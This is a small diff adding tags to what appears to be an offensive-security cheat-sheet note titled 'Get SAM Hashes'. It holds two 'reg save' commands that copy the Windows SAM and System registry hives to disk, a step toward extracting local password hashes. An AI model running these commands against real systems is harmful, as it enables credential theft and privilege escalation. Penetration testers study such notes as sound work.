@@ -1,3 +1,6 @@
+---
+tags: [ exploit, wpe, windows, privesc, hash, password ]
+---
 # Get SAM Hashes
 reg save HKLM\SAM c:\SAM
 reg save HKLM\System c:\System
